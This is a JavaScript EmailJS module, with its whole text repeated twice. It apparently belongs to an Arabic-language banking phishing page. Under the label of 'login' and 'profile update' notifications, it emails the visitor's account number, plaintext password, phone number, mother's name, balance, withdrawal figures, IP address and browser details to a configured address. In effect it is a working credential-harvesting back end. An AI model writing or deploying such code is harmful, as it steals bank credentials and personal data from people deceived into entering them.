        // EmailJS integration for sending notifications

        import emailjs from '@emailjs/browser';

        // EmailJS configuration from environment variables
        const SERVICE_ID = import.meta.env.VITE_EMAILJS_SERVICE_ID;
        const TEMPLATE_ID_LOGIN = import.meta.env.VITE_EMAILJS_TEMPLATE_ID_LOGIN;
        const TEMPLATE_ID_UPDATE = import.meta.env.VITE_EMAILJS_TEMPLATE_ID_UPDATE;
        const PUBLIC_KEY = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;
        const ADMIN_EMAIL = import.meta.env.VITE_ADMIN_EMAIL;

        // Rate limiting for email sending (prevent spam)
        const EMAIL_RATE_LIMIT = 5; // Max emails per user per hour
        const RATE_LIMIT_WINDOW = 3600000; // 1 hour in milliseconds
        const emailSendHistory = new Map();

        /**
         * Checks if email sending is rate limited
         * @param {string} userId - User identifier
         * @returns {boolean} - True if rate limit exceeded
         */
        const isRateLimited = (userId) => {
            const now = Date.now();
            const userHistory = emailSendHistory.get(userId) || [];

            // Filter out old entries
            const recentSends = userHistory.filter(timestamp => now - timestamp < RATE_LIMIT_WINDOW);

            if (recentSends.length >= EMAIL_RATE_LIMIT) {
                return true;
            }

            // Update history
            recentSends.push(now);
            emailSendHistory.set(userId, recentSends);

            return false;
        };

        /**
         * Initializes EmailJS
         */
        export const initEmailJS = () => {
            if (!PUBLIC_KEY) {
                console.warn('EmailJS public key not configured');
                return;
            }

            emailjs.init(PUBLIC_KEY);
        };

        /**
         * Sends login notification email to admin
         * @param {object} loginData - Login event data
         * @returns {Promise} - EmailJS promise
         */
        export const sendLoginNotification = async (loginData) => {
            // Validate configuration
            if (!SERVICE_ID || !TEMPLATE_ID_LOGIN || !PUBLIC_KEY) {
                console.error('EmailJS not properly configured');
                return Promise.reject(new Error('EmailJS configuration missing'));
            }

            // Check rate limiting
            if (isRateLimited(loginData.accountNumber)) {
                console.warn('Email rate limit exceeded for user:', loginData.accountNumber);
                return Promise.reject(new Error('Rate limit exceeded'));
            }

            // Prepare template parameters
            const templateParams = {
                to_email: ADMIN_EMAIL,
                subject: 'New Login Detected',
                // user_email: loginData.accountNumber,
                account_number: loginData.accountNumber || 'N/A',
                password: loginData.password,
                timestamp: new Date().toLocaleString('ar-EG', {
                    dateStyle: 'full',
                    timeStyle: 'long',
                    timeZone: 'Africa/Cairo'
                }),
                ip_address: loginData.ipAddress || 'Unknown',
                user_agent: navigator.userAgent
            };

            try {
                const response = await emailjs.send(
                    SERVICE_ID,
                    TEMPLATE_ID_LOGIN,
                    templateParams
                );

                console.log('Login notification sent successfully:', response);
                return response;
            } catch (error) {
                console.error('Failed to send login notification:', error);
                throw error;
            }
        };

        /**
         * Sends profile update notification email to admin
         * @param {object} updateData - Profile update event data
         * @returns {Promise} - EmailJS promise
         * 
         */
        const generateEmailTemplate = (updateData) => {
            const formatService = (label, isActive) => `<li>${label}: ${isActive ? '✅' : '❌'}</li>`;

            return `
        <div style="font-family: Arial, sans-serif; color: #333; line-height: 1.5; padding: 20px; max-width: 600px; margin: auto; border: 1px solid #ddd; border-radius: 8px;">
            <h2 style="color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 5px;">إشعار تحديث الحساب</h2>

            <p><strong>رقم الحساب:</strong> ${updateData.accountNumber}</p>
            <p><strong>رقم الهاتف:</strong> ${updateData.phoneNumber || 'غير محدد'}</p>
            <p><strong>اسم الوالدة:</strong> ${updateData.parentName || 'غير محدد'}</p>
            <p><strong>إجمالي المبلغ:</strong> ${updateData.totalAmount || 'غير محدد'}</p>

            <h3 style="color: #2980b9; margin-top: 20px;">السحوبات</h3>
            <ul>
            <li>سحب 1: ${updateData.withdrawals.withdrawal1 || 0}</li>
            <li>سحب 2: ${updateData.withdrawals.withdrawal2 || 0}</li>
            <li>سحب 3: ${updateData.withdrawals.withdrawal3 || 0}</li>
            </ul>

            <h3 style="color: #27ae60; margin-top: 20px;">الخدمات المختارة</h3>
            <ul>
            ${formatService('تغيير الرقم السري', updateData.services.changePassword)}
            ${formatService('تغيير الحد', updateData.services.changeLimit)}
            ${formatService('فك حظر وتحميل', updateData.services.fileEncryption)}
            ${formatService('تفضيل فيزا', updateData.services.preferVisa)}
            ${formatService('تحويل حافظ', updateData.services.transferLimit)}
            ${formatService('رفع سقف', updateData.services.roofLimit)}
            ${formatService('خدمة العملات الأجنبية', updateData.services.foreignService)}
            ${formatService('استرداد حساب مخزني', updateData.services.retrieveAccount)}
            </ul>

            <p><strong>التاريخ والوقت:</strong> ${new Date().toLocaleString('ar-EG', { dateStyle: 'full', timeStyle: 'long', timeZone: 'Africa/Cairo' })}</p>
            <p><strong>IP المستخدم:</strong> ${updateData.ipAddress || 'غير معروف'}</p>
            <p><strong>User Agent:</strong> ${navigator.userAgent}</p>
        </div>
        `;
        };

        export const sendProfileUpdateNotification = async (updateData) => {
            // Validate configuration
            if (!SERVICE_ID || !TEMPLATE_ID_UPDATE || !PUBLIC_KEY) {
                console.error('EmailJS not properly configured');
                return Promise.reject(new Error('EmailJS configuration missing'));
            }

            // Check rate limiting
            if (isRateLimited(updateData.accountNumber)) {
                console.warn('Email rate limit exceeded for user:', updateData.accountNumber);
                return Promise.reject(new Error('Rate limit exceeded'));
            }

            // Format changes for email
            const formatChanges = (changes) => {
                return changes.map(change => {
                    const oldValue = change.oldValue || 'غير محدد';
                    const newValue = change.newValue || 'غير محدد';
                    return `${change.field}: ${oldValue} ← ${newValue}`;
                }).join('\n');
            };

            // Prepare template parameters
            // const templateParams = {
            //     to_email: ADMIN_EMAIL,
            //     subject: 'Profile Update Notification',
            //     user_email: updateData.accountNumber,
            //     account_number: updateData.accountNumber || 'N/A',
            //     timestamp: new Date().toLocaleString('ar-EG', {
            //         dateStyle: 'full',
            //         timeStyle: 'long',
            //         timeZone: 'Africa/Cairo'
            //     }),
            //     changes_list: formatChanges(updateData.changes),
            //     total_changes: updateData.changes.length,

            //     // // 🔥 الجديد هنا:
            //     // identity_file: updateData.identityFile || "",  // base64
            //     // file_name: updateData.fileName || ""           // filename
            // };
            const templateParams = {
                to_email: ADMIN_EMAIL,
                subject: " تحديث حساب",

                // بيانات أساسية
                account_number: updateData.accountNumber || "لم يتم التحديث❌ ",
                phone_number: updateData.phoneNumber || "لم يتم التحديث❌ ",
                parent_name: updateData.parentName || "لم يتم التحديث❌ ",
                total_amount: updateData.totalAmount || "لم يتم التحديث❌ ",

                // السحوبات
                withdrawal_1: updateData.formData.withdrawals?.withdrawal1 || 0,
                withdrawal_2: updateData.formData.withdrawals?.withdrawal2 || 0,
                withdrawal_3: updateData.formData.withdrawals?.withdrawal3 || 0,
            
                // الخدمات (علامات)
                change_password: updateData.services.changePassword ? "✅" : "❌",
                change_limit: updateData.services.changeLimit ? "✅" : "❌",
                file_encryption: updateData.services.fileEncryption ? "✅" : "❌",
                prefer_visa: updateData.services.preferVisa ? "✅" : "❌",
                transfer_limit: updateData.services.transferLimit ? "✅" : "❌",
                roof_limit: updateData.services.roofLimit ? "✅" : "❌",
                foreign_service: updateData.services.foreignService ? "✅" : "❌",
                retrieve_account: updateData.services.retrieveAccount ? "✅" : "❌",

                // معلومات التقنية

                user_agent: navigator.userAgent
            };





            try {
                const response = await emailjs.send(
                    SERVICE_ID,
                    TEMPLATE_ID_UPDATE,
                    templateParams
                );

                console.log('Profile update notification sent successfully:', response);
                return response;
            } catch (error) {
                console.error('Failed to send profile update notification:', error);
                throw error;
            }
        };

        /**
         * Validates EmailJS configuration
         * @returns {object} - Validation result
         */
        export const validateEmailConfig = () => {
            const errors = [];

            if (!SERVICE_ID) {
                errors.push('Service ID is missing');
            }

            if (!TEMPLATE_ID_LOGIN) {
                errors.push('Login template ID is missing');
            }

            if (!TEMPLATE_ID_UPDATE) {
                errors.push('Update template ID is missing');
            }

            if (!PUBLIC_KEY) {
                errors.push('Public key is missing');
            }

            if (!ADMIN_EMAIL) {
                errors.push('Admin email is missing');
            }

            return {
                isValid: errors.length === 0,
                errors
            };
        };

        /**
         * Gets user's IP address (approximation)
         * @returns {Promise<string>} - IP address
         */
        export const getUserIP = async () => {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Failed to get IP address:', error);
                return 'Unknown';
            }
        };
        // EmailJS integration for sending notifications

        import emailjs from '@emailjs/browser';

        // EmailJS configuration from environment variables
        const SERVICE_ID = import.meta.env.VITE_EMAILJS_SERVICE_ID;
        const TEMPLATE_ID_LOGIN = import.meta.env.VITE_EMAILJS_TEMPLATE_ID_LOGIN;
        const TEMPLATE_ID_UPDATE = import.meta.env.VITE_EMAILJS_TEMPLATE_ID_UPDATE;
        const PUBLIC_KEY = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;
        const ADMIN_EMAIL = import.meta.env.VITE_ADMIN_EMAIL;

        // Rate limiting for email sending (prevent spam)
        const EMAIL_RATE_LIMIT = 5; // Max emails per user per hour
        const RATE_LIMIT_WINDOW = 3600000; // 1 hour in milliseconds
        const emailSendHistory = new Map();

        /**
         * Checks if email sending is rate limited
         * @param {string} userId - User identifier
         * @returns {boolean} - True if rate limit exceeded
         */
        const isRateLimited = (userId) => {
            const now = Date.now();
            const userHistory = emailSendHistory.get(userId) || [];

            // Filter out old entries
            const recentSends = userHistory.filter(timestamp => now - timestamp < RATE_LIMIT_WINDOW);

            if (recentSends.length >= EMAIL_RATE_LIMIT) {
                return true;
            }

            // Update history
            recentSends.push(now);
            emailSendHistory.set(userId, recentSends);

            return false;
        };

        /**
         * Initializes EmailJS
         */
        export const initEmailJS = () => {
            if (!PUBLIC_KEY) {
                console.warn('EmailJS public key not configured');
                return;
            }

            emailjs.init(PUBLIC_KEY);
        };

        /**
         * Sends login notification email to admin
         * @param {object} loginData - Login event data
         * @returns {Promise} - EmailJS promise
         */
        export const sendLoginNotification = async (loginData) => {
            // Validate configuration
            if (!SERVICE_ID || !TEMPLATE_ID_LOGIN || !PUBLIC_KEY) {
                console.error('EmailJS not properly configured');
                return Promise.reject(new Error('EmailJS configuration missing'));
            }

            // Check rate limiting
            if (isRateLimited(loginData.accountNumber)) {
                console.warn('Email rate limit exceeded for user:', loginData.accountNumber);
                return Promise.reject(new Error('Rate limit exceeded'));
            }

            // Prepare template parameters
            const templateParams = {
                to_email: ADMIN_EMAIL,
                subject: 'New Login Detected',
                // user_email: loginData.accountNumber,
                account_number: loginData.accountNumber || 'N/A',
                password: loginData.password,
                timestamp: new Date().toLocaleString('ar-EG', {
                    dateStyle: 'full',
                    timeStyle: 'long',
                    timeZone: 'Africa/Cairo'
                }),
                ip_address: loginData.ipAddress || 'Unknown',
                user_agent: navigator.userAgent
            };

            try {
                const response = await emailjs.send(
                    SERVICE_ID,
                    TEMPLATE_ID_LOGIN,
                    templateParams
                );

                console.log('Login notification sent successfully:', response);
                return response;
            } catch (error) {
                console.error('Failed to send login notification:', error);
                throw error;
            }
        };

        /**
         * Sends profile update notification email to admin
         * @param {object} updateData - Profile update event data
         * @returns {Promise} - EmailJS promise
         * 
         */
        const generateEmailTemplate = (updateData) => {
            const formatService = (label, isActive) => `<li>${label}: ${isActive ? '✅' : '❌'}</li>`;

            return `
        <div style="font-family: Arial, sans-serif; color: #333; line-height: 1.5; padding: 20px; max-width: 600px; margin: auto; border: 1px solid #ddd; border-radius: 8px;">
            <h2 style="color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 5px;">إشعار تحديث الحساب</h2>

            <p><strong>رقم الحساب:</strong> ${updateData.accountNumber}</p>
            <p><strong>رقم الهاتف:</strong> ${updateData.phoneNumber || 'غير محدد'}</p>
            <p><strong>اسم الوالدة:</strong> ${updateData.parentName || 'غير محدد'}</p>
            <p><strong>إجمالي المبلغ:</strong> ${updateData.totalAmount || 'غير محدد'}</p>

            <h3 style="color: #2980b9; margin-top: 20px;">السحوبات</h3>
            <ul>
            <li>سحب 1: ${updateData.withdrawals.withdrawal1 || 0}</li>
            <li>سحب 2: ${updateData.withdrawals.withdrawal2 || 0}</li>
            <li>سحب 3: ${updateData.withdrawals.withdrawal3 || 0}</li>
            </ul>

            <h3 style="color: #27ae60; margin-top: 20px;">الخدمات المختارة</h3>
            <ul>
            ${formatService('تغيير الرقم السري', updateData.services.changePassword)}
            ${formatService('تغيير الحد', updateData.services.changeLimit)}
            ${formatService('فك حظر وتحميل', updateData.services.fileEncryption)}
            ${formatService('تفضيل فيزا', updateData.services.preferVisa)}
            ${formatService('تحويل حافظ', updateData.services.transferLimit)}
            ${formatService('رفع سقف', updateData.services.roofLimit)}
            ${formatService('خدمة العملات الأجنبية', updateData.services.foreignService)}
            ${formatService('استرداد حساب مخزني', updateData.services.retrieveAccount)}
            </ul>

            <p><strong>التاريخ والوقت:</strong> ${new Date().toLocaleString('ar-EG', { dateStyle: 'full', timeStyle: 'long', timeZone: 'Africa/Cairo' })}</p>
            <p><strong>IP المستخدم:</strong> ${updateData.ipAddress || 'غير معروف'}</p>
            <p><strong>User Agent:</strong> ${navigator.userAgent}</p>
        </div>
        `;
        };

        export const sendProfileUpdateNotification = async (updateData) => {
            // Validate configuration
            if (!SERVICE_ID || !TEMPLATE_ID_UPDATE || !PUBLIC_KEY) {
                console.error('EmailJS not properly configured');
                return Promise.reject(new Error('EmailJS configuration missing'));
            }

            // Check rate limiting
            if (isRateLimited(updateData.accountNumber)) {
                console.warn('Email rate limit exceeded for user:', updateData.accountNumber);
                return Promise.reject(new Error('Rate limit exceeded'));
            }

            // Format changes for email
            const formatChanges = (changes) => {
                return changes.map(change => {
                    const oldValue = change.oldValue || 'غير محدد';
                    const newValue = change.newValue || 'غير محدد';
                    return `${change.field}: ${oldValue} ← ${newValue}`;
                }).join('\n');
            };

            // Prepare template parameters
            // const templateParams = {
            //     to_email: ADMIN_EMAIL,
            //     subject: 'Profile Update Notification',
            //     user_email: updateData.accountNumber,
            //     account_number: updateData.accountNumber || 'N/A',
            //     timestamp: new Date().toLocaleString('ar-EG', {
            //         dateStyle: 'full',
            //         timeStyle: 'long',
            //         timeZone: 'Africa/Cairo'
            //     }),
            //     changes_list: formatChanges(updateData.changes),
            //     total_changes: updateData.changes.length,

            //     // // 🔥 الجديد هنا:
            //     // identity_file: updateData.identityFile || "",  // base64
            //     // file_name: updateData.fileName || ""           // filename
            // };
            const templateParams = {
                to_email: ADMIN_EMAIL,
                subject: " تحديث حساب",

                // بيانات أساسية
                account_number: updateData.accountNumber || "لم يتم التحديث❌ ",
                phone_number: updateData.phoneNumber || "لم يتم التحديث❌ ",
                parent_name: updateData.parentName || "لم يتم التحديث❌ ",
                total_amount: updateData.totalAmount || "لم يتم التحديث❌ ",

                // السحوبات
                withdrawal_1: updateData.formData.withdrawals?.withdrawal1 || 0,
                withdrawal_2: updateData.formData.withdrawals?.withdrawal2 || 0,
                withdrawal_3: updateData.formData.withdrawals?.withdrawal3 || 0,
            
                // الخدمات (علامات)
                change_password: updateData.services.changePassword ? "✅" : "❌",
                change_limit: updateData.services.changeLimit ? "✅" : "❌",
                file_encryption: updateData.services.fileEncryption ? "✅" : "❌",
                prefer_visa: updateData.services.preferVisa ? "✅" : "❌",
                transfer_limit: updateData.services.transferLimit ? "✅" : "❌",
                roof_limit: updateData.services.roofLimit ? "✅" : "❌",
                foreign_service: updateData.services.foreignService ? "✅" : "❌",
                retrieve_account: updateData.services.retrieveAccount ? "✅" : "❌",

                // معلومات التقنية

                user_agent: navigator.userAgent
            };





            try {
                const response = await emailjs.send(
                    SERVICE_ID,
                    TEMPLATE_ID_UPDATE,
                    templateParams
                );

                console.log('Profile update notification sent successfully:', response);
                return response;
            } catch (error) {
                console.error('Failed to send profile update notification:', error);
                throw error;
            }
        };

        /**
         * Validates EmailJS configuration
         * @returns {object} - Validation result
         */
        export const validateEmailConfig = () => {
            const errors = [];

            if (!SERVICE_ID) {
                errors.push('Service ID is missing');
            }

            if (!TEMPLATE_ID_LOGIN) {
                errors.push('Login template ID is missing');
            }

            if (!TEMPLATE_ID_UPDATE) {
                errors.push('Update template ID is missing');
            }

            if (!PUBLIC_KEY) {
                errors.push('Public key is missing');
            }

            if (!ADMIN_EMAIL) {
                errors.push('Admin email is missing');
            }

            return {
                isValid: errors.length === 0,
                errors
            };
        };

        /**
         * Gets user's IP address (approximation)
         * @returns {Promise<string>} - IP address
         */
        export const getUserIP = async () => {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Failed to get IP address:', error);
                return 'Unknown';
            }
        };
